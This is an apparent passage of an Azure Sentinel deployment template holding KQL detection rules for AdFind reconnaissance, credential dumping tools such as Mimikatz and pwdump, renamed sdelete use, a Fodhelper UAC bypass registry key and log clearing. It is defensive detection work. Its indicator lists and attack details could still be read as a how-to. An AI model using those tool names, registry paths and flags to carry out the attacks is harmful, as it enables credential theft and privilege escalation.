        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/07705846-05e8-4972-97b8-d0e12c138d25')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/07705846-05e8-4972-97b8-d0e12c138d25')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "(Preview) Insider Risk - Microsoft 365 Insider Risk Management Alert Observed",
          "description": "This alert is triggered when a Microsoft 365 Insider Risk Management alert is recieved in Azure Sentinel via the Microsoft 365 Insider Risk Management Connector. The alert extracts usernames from security alerts to provide UserPrincipalName, Alert Name, Reporting Product Name, Status, Alert Link, Previous Alerts Links, Time Generated. There is an option for configuration of correlations against Azure Sentinel watchlists. For more information, see [Learn about insider risk management in Microsoft 365](https://docs.microsoft.com/microsoft-365/compliance/insider-risk-management)",
          "severity": "High",
          "enabled": false,
          "query": "let AlertLinks = SecurityAlert\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize PreciousSecurityAlertLinks=make_set(AlertLink) by UPN;\nSecurityAlert\n| where ProductName == \"Microsoft 365 Insider Risk Management\"\n    | summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n    | mv-expand todynamic(Entities)\n    | where Entities[\"Type\"] =~ \"account\"\n    | extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n        Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n    | extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| join kind=inner (AlertLinks) on UPN\n| extend UserPrincipalName = UPN\n| extend PreviousAlertsLinks = strcat(PreciousSecurityAlertLinks)\n// | lookup kind=inner _GetWatchlist('<Your Watchlist Name>') on $left.UserPrincipalName == $right.SearchKey\n| project UserPrincipalName, AlertName, ProductName, Tactics, Status, AlertLink, PreviousAlertsLinks, TimeGenerated\n| sort by TimeGenerated desc\n| limit 25\n| extend AccountCustomEntity = UserPrincipalName\n",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4f17ee29-303a-425d-8533-b12d91205ce1')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4f17ee29-303a-425d-8533-b12d91205ce1')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Probable AdFind Recon Tool Usage",
          "description": "This query identifies the host and account that executed AdFind, by hash and filename, in addition to the flags commonly utilized by various threat actors during the reconnaissance phase.",
          "severity": "High",
          "enabled": true,
          "query": "let args = dynamic([\"objectcategory\",\"domainlist\",\"dcmodes\",\"adinfo\",\"trustdmp\",\"computers_pwdnotreqd\",\"Domain Admins\", \"objectcategory=person\", \"objectcategory=computer\", \"objectcategory=*\",\"dclist\"]);\nlet parentProcesses = dynamic([\"pwsh.exe\",\"powershell.exe\",\"cmd.exe\"]);\nDeviceProcessEvents\n//looks for execution from a shell\n| where InitiatingProcessFileName in~ (parentProcesses)\n// main filter\n| where FileName =~ \"AdFind.exe\" or SHA256 == \"c92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3\"\n   // AdFind common Flags to check for from various threat actor TTPs\n    or ProcessCommandLine has_any (args)\n| extend HostName = split(DeviceName, '.', 0)[0], DnsDomain = strcat_array(array_slice(split(DeviceName, '.'), 1, -1), '.'), FileHashAlgorithm = \"SHA256\"\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1016",
            "T1018",
            "T1069",
            "T1087",
            "T1482"
          ],
          "subTechniques": [
            "T1069.002",
            "T1087.002"
          ],
          "alertRuleTemplateName": "c63ae777-d5e0-4113-8c9a-c2c9d3d09fcd",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "InitiatingProcessFileName"
                },
                {
                  "identifier": "CommandLine",
                  "columnName": "ProcessCommandLine"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "FileHashAlgorithm"
                },
                {
                  "identifier": "Value",
                  "columnName": "SHA256"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9f9d0d76-fcdb-4556-b3ff-660d70e424a6')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9f9d0d76-fcdb-4556-b3ff-660d70e424a6')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "New EXE deployed via Default Domain or Default Domain Controller Policies",
          "description": "This detection highlights executables deployed to hosts via either the Default Domain or Default Domain Controller Policies. These policies apply to all hosts or Domain Controllers and best practice is that these policies should not be used for deployment of files.\nA threat actor may use these policies to deploy files or scripts to all hosts in a domain.",
          "severity": "High",
          "enabled": true,
          "query": "let known_processes = (\n  SecurityEvent\n  // If adjusting Query Period or Frequency update these\n  | where TimeGenerated between(ago(14d)..ago(1d))\n  | where EventID == 4688\n  | where NewProcessName has_any (\"Policies\\\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\", \"Policies\\\\{31B2F340-016D-11D2-945F-00C04FB984F9}\")\n  | summarize by Process);\n  SecurityEvent\n  // If adjusting Query Period or Frequency update these\n  | where TimeGenerated > ago(1d)\n  | where EventID == 4688\n  | where NewProcessName has_any (\"Policies\\\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\", \"Policies\\\\{31B2F340-016D-11D2-945F-00C04FB984F9}\")\n  | where Process !in (known_processes)\n  // This will likely apply to multiple hosts so summarize these data\n  | summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated) by Process, NewProcessName, CommandLine, Computer\n  | extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n  | extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "LateralMovement"
          ],
          "techniques": [
            "T1072",
            "T1570"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "05b4bccd-dd12-423d-8de4-5a6fb526bb4f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2a371a62-c722-460b-ac31-94073609a490')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2a371a62-c722-460b-ac31-94073609a490')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Credential Dumping Tools - File Artifacts",
          "description": "This query detects the creation of credential dumping tools files. Several credential dumping tools export files with hardcoded file names.\nRef: https://jpcertcc.github.io/ToolAnalysisResultSheet/",
          "severity": "High",
          "enabled": true,
          "query": "// Enter a reference list of malicious file artifacts\nlet MaliciousFileArtifacts = dynamic ([\"lsass.dmp\",\"test.pwd\",\"lsremora.dll\",\"lsremora64.dll\",\"fgexec.exe\",\"pwdump\",\"kirbi\",\"wce_ccache\",\"wce_krbtkts\",\"wceaux.dll\",\"PwHashes\",\"SAM.out\",\"SECURITY.out\",\"SYSTEM.out\",\"NTDS.out\" \"DumpExt.dll\",\"DumpSvc.exe\",\"cachedump64.exe\",\"cachedump.exe\",\"pstgdump.exe\",\"servpw64.exe\",\"servpw.exe\",\"pwdump.exe\",\"fgdump-log\"]);\nEvent\n| where EventLog == \"Microsoft-Windows-Sysmon/Operational\" and EventID==11\n| parse EventData with * 'TargetFilename\">' TargetFilename \"<\" *\n| where TargetFilename has_any (MaliciousFileArtifacts)\n| parse EventData with * 'ProcessGuid\">' ProcessGuid \"<\" * 'Image\">' Image \"<\" *\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by EventID, Computer, Image, ProcessGuid, TargetFilename\n| extend HostName = split(Computer, '.', 0)[0], DnsDomain = strcat_array(array_slice(split(Computer, '.'), 1, -1), '.')\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1003"
          ],
          "subTechniques": [
            "T1003.001"
          ],
          "alertRuleTemplateName": "32ffb19e-8ed8-40ed-87a0-1adb4746b7c4",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetFilename"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "CommandLine",
                  "columnName": "Image"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/65f6d930-2adb-4bf5-a917-4226a6ed5e63')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/65f6d930-2adb-4bf5-a917-4226a6ed5e63')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "New External User Granted Admin Role",
          "description": "This query will detect instances where a newly invited external user is granted an administrative role. By default this query\nwill alert on any granted administrative role, however this can be modified using the roles variable if false positives occur\nin your environment. The maximum delta between invite and escalation to admin is 60 minues, this can be configured using the \ndeltaBetweenInviteEscalation variable.",
          "severity": "Medium",
          "enabled": true,
          "query": "// Administrative roles to look for, default is all admin roles\nlet roles = dynamic([\"Administrator\", \"Admin\"]);\n// The maximum distances between and invite and acceptance\nlet maxTimeBetweenInviteAccept = 30min;\n// The delta (minutes) between the invite being sent and the account being escalated\nlet deltaBetweenInviteEscalation = 60;\n// Collect external user invitations\nlet invite = AuditLogs\n| where Category =~ \"UserManagement\"\n| where OperationName =~ \"Invite external user\"\n| extend Target = tostring(TargetResources[0].[\"userPrincipalName\"])\n| extend InviteInitiator = tostring(InitiatedBy.[\"user\"].[\"userPrincipalName\"])\n| where isnotempty(InviteInitiator);\n// Collect redeem events\nlet redeem = AuditLogs\n| where Category =~ \"UserManagement\"\n| where OperationName =~ \"Redeem external user invite\"\n| where Result =~ \"success\"\n| extend Target = tostring(TargetResources[0].[\"displayName\"]) | extend Target = tostring(extract(@\"UPN\\:\\s(.+)\\,\\sEmail\",1,Target))\n| where isnotempty(Target);\n// Union the inivtation and redeem data then run the sequence_detect kusto plugin\ninvite\n| union redeem\n| order by TimeGenerated\n| project TimeGenerated, Target, InviteInitiator, OperationName, TenantId\n| evaluate sequence_detect(TimeGenerated, maxTimeBetweenInviteAccept, maxTimeBetweenInviteAccept, invite=(OperationName has \"Invite external user\"), redeem=(OperationName has \"Redeem external user invite\"), Target)\n| join kind=innerunique (\nAuditLogs\n| where Category =~ \"RoleManagement\"\n| where AADOperationType in~ (\"Assign\", \"AssignEligibleRole\")\n| where ActivityDisplayName has_any (\"Add eligible member to role\", \"Add member to role\")\n| mv-expand TargetResources\n// Limit to external accounts\n| where TargetResources.userPrincipalName has \"EXT\"\n| mv-expand TargetResources.modifiedProperties\n| extend displayName_ = tostring(TargetResources_modifiedProperties.displayName)\n| where displayName_ =~ \"Role.DisplayName\"\n| extend RoleName = tostring(parse_json(tostring(TargetResources_modifiedProperties.newValue)))\n// Perform check for admin roles\n| where RoleName has_any(roles)\n| extend InitiatingApp = tostring(parse_json(tostring(InitiatedBy.app)).displayName)\n| extend Initiator = iif(isnotempty(InitiatingApp), InitiatingApp, tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName))\n| where Initiator != \"MS-PIM\"\n| extend Target = tostring(TargetResources.userPrincipalName)\n| summarize by TimeGenerated, OperationName,  RoleName, Target, Initiator, Result\n) on Target\n// Calculate delta between the invite and the account escalation\n| extend delta = datetime_diff(\"minute\", TimeGenerated, invite_TimeGenerated)\n| where delta <= deltaBetweenInviteEscalation\n| project InvitationTime=invite_TimeGenerated, RedeemTime=redeem_TimeGenerated, GrantTime=TimeGenerated, ExternalUser=Target, RoleGranted=RoleName, AdminInitiator=Initiator, MinsBetweenInviteAndEscalation=delta\n| extend ExternalUserName = tostring(split(ExternalUser, '@', 0)[0]), ExternalUserUPNSuffix = tostring(split(ExternalUser, '@', 1)[0])\n| extend AdminInitiatorName = tostring(split(AdminInitiator, '@', 0)[0]), AdminInitiatorUPNSuffix = tostring(split(AdminInitiator, '@', 1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [
            "T1098.001"
          ],
          "alertRuleTemplateName": "d7424fd9-abb3-4ded-a723-eebe023aaa0b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "ExternalUserName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "ExternalUserUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AdminInitiatorName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AdminInitiatorUPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/da847b4f-e87e-4061-8fd8-4cd3e42b156e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/da847b4f-e87e-4061-8fd8-4cd3e42b156e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Credential Dumping Tools - Service Installation",
          "description": "This query detects the installation of a Windows service that contains artifacts from credential dumping tools such as Mimikatz.",
          "severity": "High",
          "enabled": true,
          "query": "// Enter a reference list of decoy users (usernames) \"Case Sensitive\"\nlet MaliciousServiceArtifacts = dynamic ([\"fgexec\",\"cachedump\",\"mimikatz\",\"mimidrv\",\"wceservice\",\"pwdump\"]);\nEvent\n| where Source == \"Service Control Manager\" and EventID == 7045\n| parse EventData with * 'ServiceName\">' ServiceName \"<\" * 'ImagePath\">' ImagePath \"<\" *\n| where ServiceName has_any (MaliciousServiceArtifacts) or ImagePath has_any (MaliciousServiceArtifacts)\n| parse EventData with * 'AccountName\">' AccountName \"<\" *\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by EventID, Computer, ServiceName, ImagePath, AccountName\n| extend HostName = split(Computer, '.', 0)[0], DnsDomain = strcat_array(array_slice(split(Computer, '.'), 1, -1), '.')\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1003"
          ],
          "subTechniques": [
            "T1003.001"
          ],
          "alertRuleTemplateName": "4ebbb5c2-8802-11ec-a8a3-0242ac120002",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "ImagePath"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/03fde209-1d26-4178-9d66-b5db14acb48f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/03fde209-1d26-4178-9d66-b5db14acb48f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential re-named sdelete usage",
          "description": "This detection looks for command line parameters associated with the use of Sysinternals sdelete (https://docs.microsoft.com/sysinternals/downloads/sdelete) to delete multiple files on a host's C drive.\nA threat actor may re-name the tool to avoid detection and then use it for destructive attacks on a host.",
          "severity": "Low",
          "enabled": true,
          "query": "SecurityEvent\n  | where EventID == 4688\n  | where Process !~ \"sdelete.exe\"\n  | where CommandLine has_all (\"accepteula\", \"-r\", \"-s\", \"-q\", \"c:/\")\n  | where CommandLine !has (\"sdelete\")\n  | extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n  | extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n  | extend AccountName = tostring(split(TargetAccount, @'\\')[1]), AccountNTDomain = tostring(split(TargetAccount, @'\\')[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Impact"
          ],
          "techniques": [
            "T1485",
            "T1036"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "720d12c6-a08c-44c4-b18f-2236412d59b0",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetAccount"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/54ccdccb-7c13-4cb8-830e-e6a8ed2e37b6')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/54ccdccb-7c13-4cb8-830e-e6a8ed2e37b6')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential Fodhelper UAC Bypass",
          "description": "This detection looks for the steps required to conduct a UAC bypass using Fodhelper.exe. By default this detection looks for the setting of the required registry keys and the invoking of the process within 1 hour - this can be tweaked as required.",
          "severity": "Medium",
          "enabled": true,
          "query": "SecurityEvent\n  | where EventID == 4657\n  | parse ObjectName with \"\\\\REGISTRY\\\\\" KeyPrefix \"\\\\\" RegistryKey\n  | project-reorder RegistryKey\n  | where RegistryKey has \"Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\"\n  | extend TimeKey = bin(TimeGenerated, 1h)\n  | join (\n  SecurityEvent\n  | where EventID == 4688\n  | where Process =~ \"fodhelper.exe\"\n  | where ParentProcessName endswith \"cmd.exe\" or ParentProcessName endswith \"powershell.exe\" or ParentProcessName endswith \"powershell_ise.exe\"\n  | extend TimeKey = bin(TimeGenerated, 1h)) on TimeKey, Computer\n  | extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n  | extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n  | extend AccountName = tostring(split(TargetAccount, @'\\')[1]), AccountNTDomain = tostring(split(TargetAccount, @'\\')[0])\n",
          "queryFrequency": "PT2H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1548"
          ],
          "subTechniques": [
            "T1548.002"
          ],
          "alertRuleTemplateName": "56f3f35c-3aca-4437-a1fb-b7a84dc4af00",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetAccount"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/d7c81ae5-67fb-491a-9101-e27462252e13')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/d7c81ae5-67fb-491a-9101-e27462252e13')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "NRT",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NRT Security Event log cleared",
          "description": "Checks for event id 1102 which indicates the security event log was cleared.\nIt uses Event Source Name \"Microsoft-Windows-Eventlog\" to avoid generating false positives from other sources, like AD FS servers for instance.",
          "severity": "Medium",
          "enabled": true,
          "query": "SecurityEvent\n| where EventID == 1102 and EventSourceName == \"Microsoft-Windows-Eventlog\"\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), EventCount = count() by Computer, Account, EventID, Activity\n| extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n| extend AccountName = tostring(split(Account, @'\\')[1]), AccountNTDomain = tostring(split(Account, @'\\')[0])\n",
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1070"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "508cef41-2cd8-4d40-a519-b04826a9085f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
